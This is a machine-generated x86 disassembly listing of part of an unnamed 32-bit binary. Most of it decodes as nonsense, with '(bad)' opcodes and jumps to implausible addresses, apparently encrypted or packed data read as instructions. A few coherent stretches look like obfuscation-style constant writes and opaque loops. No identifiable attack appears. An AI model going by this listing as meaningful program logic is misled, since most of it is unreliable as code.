  409894:	cld    
  409895:	add    ebp,esp
  409897:	dec    esp
  409898:	fwait
  409899:	ins    BYTE PTR es:[edi],dx
  40989a:	inc    esi
  40989b:	lds    edx,FWORD PTR [edx+eiz*4]
  40989e:	fldenv [eax]
  4098a0:	push   ss
  4098a1:	jle    0x40990a
  4098a3:	mov    edx,0x9f891f7f
  4098a8:	test   BYTE PTR [eax+eax*8+0x4defa7c3],al
  4098af:	hlt    
  4098b0:	jno    0x4098ec
  4098b2:	inc    ebx
  4098b3:	xchg   edi,eax
  4098b4:	xchg   esi,eax
  4098b5:	mov    esi,0xdd351fea
  4098ba:	pop    eax
  4098bb:	push   es
  4098bc:	xor    eax,0xd62e3260
  4098c1:	xchg   ecx,eax
  4098c2:	mov    DWORD PTR [eax+eax*8-0xa38eb7e],eax
  4098c9:	bound  edi,QWORD PTR [esi+eax*1-0x3c]
  4098cd:	adc    ecx,esi
  4098cf:	jle    0x40994d
  4098d1:	jmp    0x269d:0x517dfa8a
  4098d8:	loop   0x409924
  4098da:	test   al,0xe1
  4098dc:	sbb    al,0xdf
  4098de:	lods   al,BYTE PTR ds:[esi]
  4098df:	and    ch,BYTE PTR [esi-0x7d1f2fa8]
  4098e5:	push   esp
  4098e6:	xlat   BYTE PTR ds:[ebx]
  4098e7:	aas    
  4098e8:	dec    esp
  4098e9:	and    al,0xb3
  4098eb:	push   ds
  4098ec:	mov    dh,0xb2
  4098ee:	adc    DWORD PTR [eax+0x41],0x1c727ccd
  4098f5:	jecxz  0x4098aa
  4098f7:	neg    DWORD PTR [ebp+0x7a08fbcf]
  4098fd:	xor    edi,0xffffffdf
  409900:	inc    ebx
  409901:	jae    0x4098ee
  409903:	imul   esp,DWORD PTR [ebx],0xb3a3a63d
  409909:	dec    edx
  40990a:	jg     0x409979
  40990c:	adc    dl,dl
  40990e:	or     eax,0x2a67ab3b
  409913:	sbb    ah,cl
  409915:	mov    edx,0x6aad1a6f
  40991a:	lock out 0x3e,al
  40991d:	addr16 jb 0x4098dc
  409920:	daa    
  409921:	mov    ch,0xa7
  409923:	sbb    eax,0x38773e14
  409928:	lods   eax,DWORD PTR ds:[esi]
  409929:	inc    esi
  40992a:	js     0x409953
  40992c:	dec    eax
  40992d:	dec    ecx
  40992e:	sub    DWORD PTR [ecx+0x3b],esi
  409931:	(bad)  
  409932:	mov    bh,0x97
  409934:	mov    ch,BYTE PTR [ebx+0x3d2a468]
  40993a:	cmp    al,0xd0
  40993c:	aas    
  40993d:	stos   BYTE PTR es:[edi],al
  40993e:	nop
  40993f:	js     0x4098f0
  409941:	jle    0x4099be
  409943:	jge    0x4099a0
  409945:	mov    BYTE PTR [eax],bl
  409947:	xor    eax,ebx
  409949:	enter  0x1a69,0x89
  40994d:	dec    edx
  40994e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40994f:	lea    ecx,[ecx+0x3c]
  409952:	or     DWORD PTR ds:0x4275a391,edx
  409958:	jb     0x4098f4
  40995a:	jg     0x4098e8
  40995c:	sar    DWORD PTR [eax+eiz*8+0x3b],1
  409960:	idiv   DWORD PTR [edx+0x14]
  409963:	sub    al,BYTE PTR [esi+0x2edb1ad3]
  409969:	call   0x7b692436
  40996e:	jmp    0xae2d6018
  409973:	call   0x6096:0xea0596b0
  40997a:	mov    eax,ds:0xf9655cd6
  40997f:	xchg   ebp,eax
  409980:	push   0x1a
  409982:	clc    
  409983:	mov    dh,0x58
  409985:	rol    DWORD PTR [bx+di],cl
  409988:	pusha  
  409989:	retf   0x4ee4
  40998c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40998d:	inc    esi
  40998e:	hlt    
  40998f:	test   al,0x2c
  409991:	shr    esi,1
  409993:	out    dx,eax
  409994:	jne    0x40993c
  409996:	pop    ebx
  409997:	std    
  409998:	cli    
  409999:	(bad)  
  40999a:	pusha  
  40999b:	xchg   DWORD PTR [ebp-0xe],esi
  40999e:	(bad)  
  40999f:	lods   eax,DWORD PTR ds:[esi]
  4099a0:	mov    BYTE PTR cs:[edx],bh
  4099a3:	mov    ecx,DWORD PTR [edi+0x13]
  4099a6:	neg    DWORD PTR [edi+0x34b00932]
  4099ac:	xchg   ebp,eax
  4099ad:	les    esp,FWORD PTR [esp+eax*4+0x15de8995]
  4099b4:	mov    ebp,0xa6ca18ee
  4099b9:	add    al,BYTE PTR [eax+0x7e]
  4099bc:	mov    edi,0xdcac0967
  4099c1:	xor    al,0xdd
  4099c3:	adc    eax,0x15895194
  4099c8:	cmc    
  4099c9:	scas   eax,DWORD PTR es:[edi]
  4099ca:	inc    edx
  4099cb:	add    BYTE PTR [ecx-0x48],dl
  4099ce:	lahf   
  4099cf:	cld    
  4099d0:	mov    ds:0x505c705,eax
  4099d5:	mov    al,0x42
  4099d7:	add    bl,bh
  4099d9:	dec    ecx
  4099da:	add    BYTE PTR [eax],al
  4099dc:	mov    DWORD PTR [ebp-0x4],eax
  4099df:	mov    DWORD PTR ds:0x42aff5,edi
  4099e5:	mov    ecx,DWORD PTR [ebp-0x4]
  4099e8:	mov    DWORD PTR ds:0x42af79,0x12dd
  4099f2:	mov    DWORD PTR [ebp-0x8],0x4f35
  4099f9:	cmp    ecx,eax
  4099fb:	jne    0x40a060
  409a01:	xor    ecx,DWORD PTR ds:0x42aef9
  409a07:	jmp    0x409cfa
  409a0c:	(bad)  
  409a0d:	retf   
  409a0e:	rcl    dh,1
  409a10:	xlat   BYTE PTR ds:[ebx]
  409a11:	fxch   st(2)
  409a13:	fst    DWORD PTR [ecx+0x3ec14cf]
  409a19:	mov    ds:0xf7b6a4dd,eax
  409a1e:	js     0x409a98
  409a20:	push   edx
  409a21:	jle    0x409a9b
  409a23:	js     0x4099b5
  409a25:	inc    esi
  409a26:	pop    esp
  409a27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a28:	fidivr WORD PTR [ebx+0x6d1077aa]
  409a2e:	fs div eax
  409a31:	xchg   BYTE PTR [ebx-0x6d5abdb3],dh
  409a37:	jns    0x409a52
  409a39:	nop
  409a3a:	sub    eax,0xfa08d088
  409a3f:	jmp    0xbf84:0x8e5eccf6
  409a46:	test   al,0x4
  409a48:	mov    eax,DWORD PTR [edx-0x46]
  409a4b:	fldenv [ebp+0x461f271b]
  409a51:	jns    0x409a13
  409a53:	and    bl,BYTE PTR [esi+0x5b5ad58a]
  409a59:	cmc    
  409a5a:	xor    esp,DWORD PTR ds:0xe511b87
  409a60:	sbb    DWORD PTR [edx],edx
  409a62:	rol    dl,1
  409a64:	int3   
  409a65:	lods   al,BYTE PTR ds:[esi]
  409a66:	mov    bh,0xbe
  409a68:	inc    ebp
  409a69:	out    0x46,eax
  409a6b:	sar    BYTE PTR [eax-0x68870667],1
  409a71:	mov    BYTE PTR [ebx-0xe],al
  409a74:	xchg   ecx,eax
  409a75:	loop   0x409a59
  409a77:	mul    BYTE PTR [ebx]
  409a79:	std    
  409a7a:	sahf   
  409a7b:	xchg   ebx,eax
  409a7c:	mov    ch,0x89
  409a7e:	jae    0x409a50
  409a80:	and    esp,DWORD PTR [ecx+0x24]
  409a83:	push   es
  409a84:	rol    DWORD PTR [ecx-0x47],1
  409a87:	fst    QWORD PTR [esp+esi*8]
  409a8a:	gs xchg edx,eax
  409a8c:	push   eax
  409a8d:	mov    eax,ds:0x2bdc3a94
  409a92:	pop    es
  409a93:	push   ecx
  409a94:	bound  ebp,QWORD PTR [ecx+0x63]
  409a97:	mov    dl,0x5f
  409a99:	lods   al,BYTE PTR es:[esi]
  409a9b:	fsubr  st,st(4)
  409a9d:	xchg   ecx,eax
  409a9e:	je     0x409a6b
  409aa0:	cs inc esp
  409aa2:	fistp  WORD PTR [ebp-0x701e8d65]
  409aa8:	sub    DWORD PTR [edx+0x3f],esp
  409aab:	inc    esi
  409aac:	adc    bh,BYTE PTR [ebp+edx*8-0x4a714d02]
  409ab3:	popf   
  409ab4:	xchg   edx,eax
  409ab5:	ret    
  409ab6:	xor    eax,DWORD PTR [eax-0x8e9d14f]
  409abc:	in     al,dx
  409abd:	(bad)  
  409abe:	sbb    bh,ah
  409ac0:	jae    0x409a67
  409ac2:	fbstp  TBYTE PTR ds:0xc331fa3c
  409ac8:	mov    eax,0x3a9af539
  409acd:	clc    
  409ace:	lock dec edx
  409ad0:	aaa    
  409ad1:	out    dx,eax
  409ad2:	jmp    0x11ba:0x34f0dbfd
  409ad9:	rol    DWORD PTR [edx-0x21],1
  409adc:	in     eax,dx
  409add:	jnp    0x409b55
  409adf:	fbld   TBYTE PTR [edi-0x23]
  409ae2:	ret    
  409ae3:	fwait
  409ae4:	out    0x33,al
  409ae6:	pop    ss
  409ae7:	mov    esi,DWORD PTR [eax]
  409ae9:	jae    0x409acd
  409aeb:	call   0xe93f129b
  409af0:	xchg   ebx,eax
  409af1:	jno    0x409b3f
  409af3:	test   DWORD PTR [esi+0x387587fb],edx
  409af9:	push   ebx
  409afa:	(bad)  
  409afb:	sub    eax,0x6c4c09d8
  409b00:	cmp    DWORD PTR [esi-0x7469c6f0],0xffffffce
  409b07:	jmp    0x4ec9e5ad
  409b0c:	lods   eax,DWORD PTR ds:[esi]
  409b0d:	std    
  409b0e:	adc    DWORD PTR [ecx-0x6a],0x58459abc
  409b15:	in     al,0xf3
  409b17:	(bad)  
  409b18:	jns    0x409b59
  409b1a:	mov    al,0x9
  409b1c:	cmp    DWORD PTR [esi+0x2c],eax
  409b1f:	loop   0x409b84
  409b21:	xchg   ebp,eax
  409b22:	sub    BYTE PTR [ebp+0x2f231fb4],dh
  409b28:	cmp    DWORD PTR [ebx],esp
  409b2a:	mov    al,0x1f
  409b2c:	rcr    ebx,1
  409b2e:	loopne 0x409b7d
  409b30:	push   ecx
  409b31:	aas    
  409b32:	adc    dh,BYTE PTR [ecx-0x3]
  409b35:	daa    
  409b36:	xlat   BYTE PTR ds:[ebx]
  409b37:	cs out dx,eax
  409b39:	int    0x9b
  409b3b:	sbb    eax,0x541be5a7
  409b40:	mov    bh,0xc7
  409b42:	ins    BYTE PTR es:[edi],dx
  409b43:	mov    cl,0xe4
  409b45:	sub    BYTE PTR [edx+eiz*2-0x46],dl
  409b49:	cmp    eax,0xd5117913
  409b4e:	mov    al,0xd7
  409b50:	es mov esi,0x959fd409
  409b56:	das    
  409b57:	mov    ebx,0xf0a5924c
  409b5c:	cmp    DWORD PTR [ebx+0x54],ebx
  409b5f:	push   cs
  409b60:	push   ecx
  409b61:	cmp    BYTE PTR [ecx+0x32e78a56],bh
  409b67:	pop    edi
  409b68:	or     ecx,DWORD PTR [ebx]
  409b6a:	std    
  409b6b:	sti    
  409b6c:	mov    ds:0xba06c879,eax
  409b71:	stc    
  409b72:	(bad)  
  409b73:	cmp    edx,ebp
  409b75:	push   0x5d95eeb2
  409b7a:	jecxz  0x409bfa
  409b7c:	in     eax,dx
  409b7d:	adc    esi,DWORD PTR [ebp+0x4f2472e3]
  409b83:	pop    ss
  409b84:	xor    eax,0x8d122e39
  409b89:	mov    ecx,0x6aaa423f
  409b8e:	das    
  409b8f:	add    al,0x66
  409b91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b92:	pop    esp
  409b93:	in     eax,dx
  409b94:	jns    0x409b6e
  409b96:	dec    ecx
  409b97:	adc    DWORD PTR [edx+0x13],edx
  409b9a:	cli    
  409b9b:	mov    dh,0x16
  409b9d:	or     eax,0xf8815c46
  409ba2:	fiadd  DWORD PTR [eax]
  409ba4:	popa   
  409ba5:	shl    BYTE PTR [edi-0x7d],1
  409ba8:	sub    al,0x5f
  409baa:	push   es
  409bab:	loopne 0x409be9
  409bad:	push   0xa83f265
  409bb2:	push   0xefb6ae29
  409bb7:	adc    al,0xe
  409bb9:	or     dh,dl
  409bbb:	rcl    ch,1
  409bbd:	sbb    BYTE PTR [edi+0x50],bh
  409bc0:	jecxz  0x409bdc
  409bc2:	fistp  WORD PTR [edx]
  409bc4:	fst    DWORD PTR [edx-0x69e0d5cb]
  409bca:	adc    DWORD PTR [ebx-0x41],edx
  409bcd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409bce:	icebp  
  409bcf:	xchg   esi,eax
  409bd0:	das    
  409bd1:	inc    ebx
  409bd2:	mov    ecx,0x40c69420
  409bd7:	push   0x69
  409bd9:	mov    dl,dl
  409bdb:	scas   eax,DWORD PTR es:[edi]
  409bdc:	rcl    BYTE PTR [esi+0x50],1
  409bdf:	ret    0xa4f5
  409be2:	pop    edx
  409be3:	pusha  
  409be4:	fs push es
  409be6:	fisttp WORD PTR [edi+ebp*8-0x4d8636af]
  409bed:	pop    ds
  409bee:	in     al,0x91
  409bf0:	popa   
  409bf1:	repz pop esp
  409bf3:	jns    0x409bec
  409bf5:	in     eax,dx
  409bf6:	push   edi
  409bf7:	jnp    0x409bd8
  409bf9:	das    
  409bfa:	or     esi,esi
  409bfc:	ds push ebx
  409bfe:	or     BYTE PTR [edx-0x65d557f6],al
  409c04:	iret   
  409c05:	fwait
  409c06:	les    edi,FWORD PTR [ecx]
  409c08:	inc    eax
  409c09:	dec    esi
  409c0a:	lock mov bh,0xf6
  409c0e:	mov    esi,0xc08c24c4
  409c13:	mov    ah,0x8c
  409c15:	rcl    BYTE PTR [ebx-0x4c],1
  409c18:	(bad)  
  409c19:	and    DWORD PTR cs:[ecx],ebp
  409c1c:	scas   eax,DWORD PTR es:[edi]
  409c1d:	stos   DWORD PTR es:[edi],eax
  409c1e:	in     al,dx
  409c1f:	je     0x409bd3
  409c21:	xlat   BYTE PTR ds:[ebx]
  409c22:	mov    ds:0xe6a47260,eax
  409c27:	hlt    
  409c28:	add    edx,DWORD PTR ds:0xc8acd4ad
  409c2e:	mov    dh,dh
  409c30:	mov    dh,0xa8
  409c32:	xor    BYTE PTR [ebx+0x20],ch
  409c35:	xor    eax,0xf9456b75
  409c3a:	cdq    
  409c3b:	add    al,0xb7
  409c3d:	cmc    
  409c3e:	mov    ebx,0x335ba479
  409c43:	jmp    FWORD PTR [ecx-0x48f71eb2]
  409c49:	popa   
  409c4a:	dec    ecx
  409c4b:	int    0xec
  409c4d:	icebp  
  409c4e:	or     al,0x17
  409c50:	cmp    al,0x3c
  409c52:	jle    0x409c6c
  409c54:	loopne 0x409c10
  409c56:	xor    BYTE PTR [edx],dl
  409c58:	jecxz  0x409c89
  409c5a:	rcr    DWORD PTR [esi+0x13],cl
  409c5d:	fsub   QWORD PTR [edi]
  409c5f:	es popa 
  409c61:	cwde   
  409c62:	mov    ebp,0x6f0272a0
  409c67:	adc    DWORD PTR [eax],eax
  409c69:	stos   DWORD PTR es:[edi],eax
  409c6a:	test   BYTE PTR [esi-0x2f],0xbd
  409c6e:	jge    0x409c1e
  409c70:	sar    bl,0xc5
  409c73:	push   ecx
  409c74:	addr16 mov ch,0x92
  409c77:	xchg   ebp,eax
  409c78:	retf   0xb120
  409c7b:	jle    0x409c86
  409c7d:	cdq    
  409c7e:	inc    esi
  409c7f:	and    ebp,ebp
  409c81:	cs pop edx
  409c83:	fwait
  409c84:	imul   esi,edi,0xffffffb2
  409c87:	jl     0x409c79
  409c89:	cmp    al,0x38
  409c8b:	add    al,0x49
  409c8d:	dec    ecx
  409c8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c8f:	add    eax,0x66cc220b
  409c94:	push   ds
  409c95:	sti    
  409c96:	sub    dl,BYTE PTR [eax+ebx*4]
  409c99:	mov    cl,0x97
  409c9b:	inc    ebp
  409c9c:	pusha  
  409c9d:	adc    eax,DWORD PTR [ecx+0x597f2798]
  409ca3:	xor    ah,BYTE PTR [edi+0x730f4922]
  409ca9:	scas   eax,DWORD PTR es:[edi]
  409caa:	adc    esp,DWORD PTR [eax+esi*1]
  409cad:	mov    ah,0x66
  409caf:	fistp  WORD PTR [edi-0x14c39e52]
  409cb5:	in     al,0xd
  409cb7:	retf   0xd9b9
  409cba:	xchg   esp,eax
  409cbb:	jg     0x409c81
  409cbd:	shl    BYTE PTR [ebp-0xebb8599],cl
  409cc3:	xchg   edx,eax
  409cc4:	push   ebp
  409cc5:	outs   dx,BYTE PTR ds:[esi]
  409cc6:	rcl    cl,cl
  409cc8:	fwait
  409cc9:	xchg   ebx,eax
  409cca:	jns    0x409ce4
  409ccc:	sbb    eax,0x71a6de42
  409cd1:	int3   
  409cd2:	repnz and DWORD PTR [ecx],esi
  409cd5:	ss call 0xbfb3:0xd64ea897
  409cdd:	mov    eax,0x1e05e7a6
  409ce2:	and    al,BYTE PTR [edi]
  409ce4:	and    al,0xbc
  409ce6:	ret    
  409ce7:	xor    eax,0xa737e7e
  409cec:	adc    bl,BYTE PTR [edx+0x770a19a9]
  409cf2:	pop    ecx
  409cf3:	inc    esp
  409cf4:	mov    eax,ds:0x2da5ff51
  409cf9:	int3   
  409cfa:	mov    ax,WORD PTR [ebp-0x8]
  409cfe:	sbb    DWORD PTR ds:0x42aef9,0x42af85
  409d08:	mov    ecx,0x8a36
  409d0d:	xor    ax,cx
  409d10:	and    ecx,0x5dd3
  409d16:	mov    ecx,0x3afc
  409d1b:	add    ax,cx
  409d1e:	neg    ecx
  409d20:	mov    ecx,DWORD PTR [ebp+0x8]
  409d23:	or     DWORD PTR ds:0x42aefd,0x299c
  409d2d:	movzx  eax,ax
  409d30:	sbb    DWORD PTR ds:0x42afc1,0x42afbd
  409d3a:	not    eax
  409d3c:	xor    DWORD PTR ds:0x42afb1,0x55d1
  409d46:	and    eax,DWORD PTR [ecx]
  409d48:	jmp    0x40a03b
  409d4d:	ret    
  409d4e:	int3   
  409d4f:	leave  
  409d50:	(bad)  
  409d51:	(bad)  
  409d53:	rcr    ecx,cl
  409d55:	sahf   
  409d56:	inc    edx
  409d57:	imul   edx,DWORD PTR [edi+0x1846b2f5],0xffffff88
  409d5e:	hlt    
  409d5f:	js     0x409dd9
  409d61:	push   edx
  409d62:	jle    0x409ddc
  409d64:	js     0x409d9a
  409d66:	clc    
  409d67:	jne    0x409ddb
  409d69:	test   BYTE PTR [eax-0x1cd476cb],bl
  409d6f:	or     BYTE PTR [ecx],cl
  409d71:	jmp    0x76e00d40
  409d76:	xor    ah,al
  409d78:	pusha  
  409d79:	int    0xaa
  409d7b:	repnz add ah,0x67
  409d7f:	and    eax,0xb85a7b76
  409d84:	gs mov ch,0xcc
  409d87:	pop    esi
  409d88:	jle    0x409dd7
  409d8a:	sbb    edi,ebp
  409d8c:	iret   
  409d8d:	mov    ebx,0xc7d394de
  409d92:	inc    eax
  409d93:	and    eax,DWORD PTR [ebp+0x72a544da]
  409d99:	in     al,dx
  409d9a:	cmp    eax,0x83a1b5ae
  409d9f:	aaa    
  409da0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409da1:	enter  0xd6b8,0x10
  409da5:	jno    0x409d62
  409da7:	ins    DWORD PTR es:[edi],dx
  409da8:	sub    DWORD PTR [esi-0x2f],0x3e5d71d1
  409daf:	bound  ebp,QWORD PTR [eax]
  409db1:	shl    BYTE PTR [eax-0x1026f9e6],cl
  409db7:	mov    bl,0xb9
  409db9:	xor    BYTE PTR [ecx],bl
  409dbb:	jns    0x409d62
  409dbd:	les    ebx,FWORD PTR [edi]
  409dbf:	push   ebx
  409dc0:	sar    BYTE PTR [eax+edx*2+0x67],0xa5
  409dc5:	push   esp
  409dc6:	sbb    al,0xbc
  409dc8:	mov    eax,ss
  409dca:	sar    BYTE PTR [ebx+0x0],cl
  409dcd:	push   0xfffffff9
  409dcf:	div    DWORD PTR [ecx+0x4ae62afe]
  409dd5:	add    al,0xfb
  409dd7:	dec    eax
  409dd8:	popa   
  409dd9:	je     0x409d73
  409ddb:	es jo  0x409dcd
  409dde:	and    al,0xeb
  409de0:	or     eax,0xd71892f9
  409de5:	icebp  
  409de6:	xchg   esp,eax
  409de7:	ss xor al,0x6d
  409dea:	inc    ebp
  409deb:	js     0x409e37
  409ded:	aam    0x69
  409def:	ret    
  409df0:	test   DWORD PTR [edi-0x3007d643],ebp
  409df6:	leave  
  409df7:	mov    ebx,edx
  409df9:	fldenv [ebp+0x0]
  409dfc:	sub    al,0xa6
  409dfe:	in     eax,0xb4
  409e00:	aam    0xa7
  409e02:	mov    eax,0xae4cae9d
  409e07:	xor    cl,dl
  409e09:	inc    ecx
  409e0a:	push   ecx
  409e0b:	stos   DWORD PTR es:[edi],eax
  409e0c:	mov    edi,0x806e11b3
  409e11:	xchg   DWORD PTR [ebp-0x17],edi
  409e14:	inc    edx
  409e15:	fiadd  WORD PTR [edx]
  409e17:	f2xm1  
  409e19:	adc    DWORD PTR ds:0xfc69cf55,0x36
  409e20:	add    edx,DWORD PTR [esi+0x51]
  409e23:	add    esp,ecx
  409e25:	jno    0x409e69
  409e27:	in     al,dx
  409e28:	ficom  DWORD PTR [edi+0x31]
  409e2b:	pop    eax
  409e2c:	dec    edx
  409e2d:	xchg   esp,eax
  409e2e:	dec    edx
  409e2f:	(bad)  
  409e30:	jp     0x409e6f
  409e32:	adc    eax,0xef3de2a0
  409e37:	ret    
  409e38:	out    dx,al
  409e39:	sub    bh,BYTE PTR ds:0x97c90011
  409e3f:	std    
  409e40:	cmc    
  409e41:	pushf  
  409e42:	inc    eax
  409e43:	add    al,0xb8
  409e45:	inc    esp
  409e46:	inc    edx
  409e47:	dec    esi
  409e48:	sar    BYTE PTR [ebx],1
  409e4a:	aas    
  409e4b:	xchg   ebx,eax
  409e4c:	(bad)  
  409e4d:	jne    0x409eaa
  409e4f:	fmul   st,st(2)
  409e51:	ss jae 0x409ead
  409e54:	std    
  409e55:	rol    bh,cl
  409e57:	js     0x409e14
  409e59:	imul   esp,DWORD PTR [edx+eiz*2+0x60],0x4c
  409e5e:	push   esp
  409e5f:	out    dx,eax
  409e60:	out    dx,eax
  409e61:	or     BYTE PTR fs:[ecx],bl
  409e64:	jns    0x409e1c
  409e66:	add    BYTE PTR [eax],dl
  409e68:	sbb    ebp,DWORD PTR [ebp-0x23a7775f]
  409e6e:	jmp    0xb916:0xaf1f2d9f
  409e75:	in     al,dx
  409e76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e77:	out    0xa1,al
  409e79:	gs mov edi,eax
  409e7c:	or     DWORD PTR [edi+esi*8+0x77],0xffffff97
  409e81:	scas   eax,DWORD PTR es:[edi]
  409e82:	jg     0x409ec3
  409e84:	dec    ebp
  409e85:	adc    eax,0xba49f32a
  409e8a:	and    ch,BYTE PTR [edx+esi*2+0x63]
  409e8e:	mov    BYTE PTR [edi-0x331f2fe],al
  409e94:	fdiv   DWORD PTR [edx-0x1f787ea7]
  409e9a:	fld    st(2)
  409e9c:	xchg   esi,eax
  409e9d:	jo     0x409ec0
  409e9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ea0:	inc    esp
  409ea1:	sbb    eax,0xfa5cc9ee
  409ea6:	jns    0x409f0d
  409ea8:	pop    ebx
  409ea9:	sar    BYTE PTR [edi],1
  409eab:	inc    ecx
  409eac:	jns    0x409e53
  409eae:	jle    0x409e8c
  409eb0:	repnz test eax,0xe94c55c9
  409eb6:	cdq    
  409eb7:	lea    ebx,[edx+0x5c4a60e]
  409ebd:	mov    edi,0xe3e3b6c2
  409ec2:	and    esi,eax
  409ec4:	or     BYTE PTR ds:0x73295efe,ch
  409eca:	call   0x25d2abdc
  409ecf:	icebp  
  409ed0:	cld    
  409ed1:	enter  0xd52b,0xd4
  409ed5:	bound  ebp,QWORD PTR [ebx+0x70]
  409ed8:	repnz mov ebp,0x7fade119
  409ede:	test   eax,0x59897433
  409ee3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ee4:	push   esi
  409ee5:	cdq    
  409ee6:	cmp    eax,edx
  409ee8:	and    eax,0xb6cfad4a
  409eed:	ds stos BYTE PTR es:[edi],al
  409eef:	push   ebx
  409ef0:	out    0x17,eax
  409ef2:	stc    
  409ef3:	es jl  0x409e9c
  409ef6:	jb     0x409e83
  409ef8:	add    dl,BYTE PTR [edx]
  409efa:	sbb    ecx,DWORD PTR [eax-0x1f4eb94d]
  409f00:	xchg   BYTE PTR [ecx+0x42],dh
  409f03:	fisub  WORD PTR [ecx+0x68]
  409f06:	outs   dx,BYTE PTR ds:[esi]
  409f07:	xlat   BYTE PTR ds:[ebx]
  409f08:	xchg   edi,eax
  409f09:	adc    eax,0xa17c2808
  409f0e:	sub    al,0x91
  409f10:	mov    cl,0xbf
  409f12:	fst    QWORD PTR [eax+edx*4-0x173e1e3c]
  409f19:	and    DWORD PTR [ebx+0x76],edi
  409f1c:	out    0x49,al
  409f1e:	mov    esp,0xb7a79620
  409f23:	xchg   ebp,eax
  409f24:	sbb    BYTE PTR [ecx-0x26],cl
  409f27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f28:	jmp    0x409eb0
  409f2a:	outs   dx,DWORD PTR ds:[esi]
  409f2b:	(bad)  
  409f2c:	pop    esp
  409f2d:	mov    al,0x61
  409f2f:	cmp    BYTE PTR [edx-0x180640b3],dh
  409f35:	call   0x10c1:0xae116aec
  409f3c:	and    DWORD PTR [edi+0x191d8343],esi
  409f42:	or     DWORD PTR ds:[esi-0x7b],esi
  409f46:	lods   al,BYTE PTR ds:[esi]
  409f47:	xchg   ebp,eax
  409f48:	dec    ecx
  409f49:	mov    cl,0xca
  409f4b:	cwde   
  409f4c:	stc    
  409f4d:	and    esi,DWORD PTR [edx]
  409f4f:	xchg   ebp,eax
  409f50:	mov    dl,0x49
  409f52:	arpl   WORD PTR [edi-0x74],bp
  409f55:	mov    ch,0xc7
  409f57:	shl    BYTE PTR [ecx],1
  409f59:	aas    
  409f5a:	inc    edi
  409f5b:	sub    ah,0x5e
  409f5e:	pop    edx
  409f5f:	shl    BYTE PTR [ebx+0x1f5ec4a9],0xc7
  409f66:	sub    al,0x11
  409f68:	test   DWORD PTR [ebp+0x617838e0],0xb469e3bb
  409f72:	out    dx,al
  409f73:	out    0xed,eax
  409f75:	in     eax,dx
  409f76:	sub    DWORD PTR [eax],esp
  409f78:	jmp    0x409f40
  409f7a:	inc    esp
  409f7b:	daa    
  409f7c:	inc    ebx
  409f7d:	pop    ebp
  409f7e:	jle    0x409ff6
  409f80:	scas   al,BYTE PTR es:[edi]
  409f81:	(bad)  
  409f82:	(bad)  
  409f84:	cmp    DWORD PTR ds:0xcbf19fb8,edx
  409f8a:	mov    ah,0x49
  409f8c:	lods   eax,DWORD PTR ds:[esi]
  409f8d:	cmp    DWORD PTR [ebx-0x6c],ebp
  409f90:	pop    ecx
  409f91:	add    BYTE PTR [eax+0x7f],ah
  409f94:	push   0x63
  409f96:	cmp    al,0x51
  409f98:	adc    BYTE PTR [ebp+0x7d],0x33
  409f9c:	push   ecx
  409f9d:	shl    BYTE PTR [ebx],cl
  409f9f:	xchg   edx,eax
  409fa0:	ret    
  409fa1:	push   edi
  409fa2:	jmp    0xdc7588a9
  409fa7:	outs   dx,DWORD PTR fs:[esi]
  409fa9:	xchg   esi,eax
  409faa:	and    ecx,DWORD PTR [edx-0x2103db5c]
  409fb0:	out    dx,al
  409fb1:	mov    bh,0x4b
  409fb3:	sub    eax,0x598eba8a
  409fb8:	xchg   esp,eax
  409fb9:	push   esi
  409fba:	les    ebx,FWORD PTR [ebx+esi*2-0x3b]
  409fbe:	add    esi,edx
  409fc0:	push   ebx
  409fc1:	dec    eax
  409fc2:	pop    edi
  409fc3:	loop   0x409fe2
  409fc5:	ds test eax,0xbe75d11d
  409fcb:	cwde   
  409fcc:	in     eax,0xb5
  409fce:	fmul   QWORD PTR [eax+0x7f4860b7]
  409fd4:	std    
  409fd5:	xor    DWORD PTR [ebx],0x6c4006da
  409fdb:	pop    ebx
  409fdc:	xchg   ebp,eax
  409fdd:	mov    ch,al
  409fdf:	jle    0x409fd2
  409fe1:	test   eax,0xcd98596
  409fe6:	mov    ecx,0x6ebefc17
  409feb:	mov    eax,0x7fadd4a6
  409ff0:	sub    DWORD PTR ss:[eax],ebp
  409ff3:	mov    ebx,0x43f7fe9e
  409ff8:	jo     0x40a003
  409ffa:	(bad)  
  409ffb:	fistp  WORD PTR [ebp+0x77]
  409ffe:	mov    edi,0x61f66146
  40a003:	(bad)  
  40a005:	je     0x40a01d
  40a007:	or     edi,DWORD PTR [ebx+0x70]
  40a00a:	mov    WORD PTR [ebp+0x71],fs
  40a00d:	addr16 (bad) 
  40a00f:	in     al,0x18
  40a011:	jne    0x409fb8
  40a013:	add    eax,0x49377357
  40a018:	sbb    esp,edi
  40a01a:	inc    edx
  40a01b:	icebp  
  40a01c:	aad    0xa4
  40a01e:	test   al,al
  40a020:	mov    ecx,edx
  40a022:	add    al,BYTE PTR [eax+0x117903bf]
  40a028:	inc    ecx
  40a029:	dec    ecx
  40a02a:	iret   
  40a02b:	xchg   ecx,eax
  40a02c:	mov    ds:0xf2abdc30,eax
  40a031:	shl    DWORD PTR [esp+eiz*2],1
  40a034:	or     DWORD PTR [ecx],ecx
  40a036:	mov    ds:0x242b70b1,eax
  40a03b:	mov    ecx,DWORD PTR [ebp+0x8]
  40a03e:	mov    DWORD PTR [ecx],eax
  40a040:	jmp    0x40a04c
  40a045:	xor    DWORD PTR [ebp-0x4],0xe149ebf
  40a04c:	mov    ax,WORD PTR [ebp-0x8]
  40a050:	push   DWORD PTR [ebp+0x8]
  40a053:	call   0x40a064
  40a058:	test   eax,eax
  40a05a:	je     0x40a045
  40a060:	leave  
  40a061:	ret    0x4
  40a064:	push   ebp
  40a065:	mov    ebp,esp
  40a067:	sub    esp,0x2c
  40a06a:	and    DWORD PTR ds:0x42aee5,0x0
  40a074:	jmp    0x40a084
  40a079:	mov    eax,ds:0x42aee5
  40a07e:	inc    eax
  40a07f:	mov    ds:0x42aee5,eax
